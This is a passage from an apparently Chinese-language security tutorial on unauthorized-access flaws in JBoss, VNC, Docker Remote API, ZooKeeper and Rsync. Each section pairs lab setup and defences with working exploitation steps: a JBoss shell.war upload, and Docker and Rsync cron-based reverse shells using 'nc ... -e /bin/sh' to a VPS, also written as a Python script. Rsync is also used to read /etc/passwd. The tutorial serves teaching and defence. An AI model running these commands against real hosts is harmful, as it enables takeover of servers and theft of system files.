#### 防御手段
-设置Memchached只允许本地访问。  
-禁止外网访问Memcached 11211端口。  
-配置访问控制策略。  
-最小化权限运行。  
-修改默认端口等。  
### JBOSS 未授权访问漏洞
#### 漏洞简介以及危害
JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB
1.1、EJB 2.0和EJB3规范。,默认情况下访问  就可以浏览 JBoss
的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。
#### 漏洞利用
##### 环境介绍
    远程木马服务器: Centos
    目标靶机: Kali
    ip地址: 192.168.18.129
    连接工具:Xshell
##### 环境搭建
这里使用我修改过的docker镜像
    docker search testjboss
    docker pull testjboss/jboss:latest
    docker images
    docker run -p 8080:8080 -d 5661a2e31006
##### 未授权访问测试
 无需认证进入控制页面  
##### 利用jboss.deployment部署shell
点击jboss.deployment进入应用部署页面  
使用apache搭建远程木马服务器  
访问木马地址http:///shell.war  
成功上传木马  
访问  
#### 防御手段
-对jmx控制页面访问添加访问验证。  
-进行JMX Console 安全配置。
### VNC 未授权访问漏洞
#### 漏洞简介以及危害
VNC 是虚拟网络控制台Virtual Network
Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux
的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 默认端口号为 5900、5901。VNC
未授权访问漏洞如被利用可能造成恶意用户直接控制target主机。
#### 漏洞利用
##### 环境介绍
    目标靶机: Windows Server 2003 Standard Edition
    ip地址: 192.168.15.8
##### 环境搭建
下载地址:  
进行安装(一直下一步即可)  
##### 未授权访问测试
    vncviewer 192.168.15.8
#### 防御手段
-配置 VNC 客户端登录口令认证并配置符合密码强度要求的密码。  
-以最小普通权限身份运行操作系统。
### Docker 未授权访问漏洞
#### 漏洞简介以及危害
Docker
是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括
VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。  
Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。存在问题的版本分别为 1.3 和
1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建
container，删除已有 container，甚至是获取宿主机的 shell。
#### 漏洞利用
##### 环境介绍
    目标靶机: Kali
    ip地址: 192.168.15.5
    连接工具:Xshell
##### 环境搭建
    # 下载环境
    mkdir docker
    cd docker 
    wget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/Dockerfile
    wget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/docker-compose.yml
    wget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/docker-entrypoint.sh
    #或者利用DownGit下载https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce
    DownGit网址：https://minhaskamal.github.io/DownGit/#/home
    chmod 777 docker-entrypoint.sh # 给docker-entrypoint.sh权限
    docker-compose build && docker-compose up -d # 编译并启动环境
##### 未授权访问测试
    docker -H tcp://192.168.15.5:2375 version
##### 通过crontab反弹宿主机shell
    # vps监听9999端口
    nc -lvnp 9999
    # 启动容器
    docker -H tcp://192.168.15.5:2375 run -id -v /etc/crontabs:/tmp alpine:latest
    docker -H tcp://192.168.15.5:2375 ps
    docker -H tcp://192.168.15.5:2375 exec -it a8ff7ed880fb sh # 进入容器
    echo '* * * * * /usr/bin/nc {vps_ip} 9999 -e /bin/sh' >> /tmp/root #添加计划任务
    cat /tmp/root # 查看/tmp/root 文件
    exit #退出容器
反弹宿主机shell  
还有其他比如写入ssh公钥等利用方式，方式方法都是大同小异的，这里就不再介绍了。
也可以直接利用python脚本
    import docker
    client = docker.DockerClient(base_url='http://{target_ip}:2375/')
    data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc {vps_ip} 9999 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
Docker 未授权访问漏洞利用脚本[没试过]
    https://github.com/Tycx2ry/docker_api_vul
#### 防御手段
-简单粗暴的方法，对2375端口做网络访问控制，如ACL控制，或者访问规则。  
-修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。
### ZooKeeper 未授权访问漏洞
#### 漏洞简介以及危害
zookeeper是分布式协同管理工具，常用来管理系统配置信息，提供分布式协同服务。Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。
#### 漏洞利用
##### 环境介绍
    目标靶机：Centos
    ip地址：172.16.2.251
    连接工具：Xshell
##### 环境搭建
    #搭建环境
    wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz
    tar -xzvf zookeeper-3.4.14.tar.gz 
    cd zookeeper-3.4.14/conf
    mv zoo_sample.cfg zoo.cfg
    ../bin/zkServer.sh start # 启动
##### 未授权访问测试
    #获取该服务器的环境
    echo envi|nc 172.16.2.251 2181
利用zookeeper可视化管理工具进行连接  
下载地址：  
#### 防御手段
-修改 ZooKeeper 默认端口，采用其他端口服务。  
-添加访问控制，配置服务来源地址限制策略。  
-增加 ZooKeeper 的认证配置。  
### Rsync 未授权访问漏洞
#### 漏洞简介以及危害
Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN
快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync
默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。Rsync 的默认端口为 837。
#### 漏洞利用
##### 环境介绍
    目标靶机：Kali
    ip地址：172.16.2.250
    连接工具：Xshell
##### 环境搭建
    #利用DownGit下载https://github.com/vulhub/vulhub/tree/master/rsync/common
    DownGit网址：https://minhaskamal.github.io/DownGit/#/home
    # 上传文件到靶机并进行解压
    unzip common.zip
    # 编译并启动docker容器
    cd common/
    docker-compose build && docker-compose up -d
##### 未授权访问测试
    #rsync rsync://{target_ip}/
    rsync rsync://172.16.2.250:873/
    rsync rsync://172.16.2.250:873/src
##### 利用rsync下载任意文件
    rsync rsync://172.16.2.250:873/src/etc/passwd ./
##### 利用rsync反弹shell
    # 下载crontab配置文件
    rsync rsync://172.16.2.250:873/src/etc/crontab ./
    该环境crontab中
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    表示每小时的第17分钟执行run-parts --report /etc/cron.hourly
    # 写入bash并赋权
    vim nc
    chmod 777
    # 将文件上传至/etc/cron.hourly
    rsync -av nc rsync://172.16.2.250:873/src/etc/cron.hourly
    # 本地监听9999
    nc -lnvp 9999
反弹成功。  
#### 防御手段
-账户认证：正确配置认证用户名及密码。  
-权限控制：使用合理的权限。  
-网络访问控制：控制接入源ip。  
-数据加密传输等  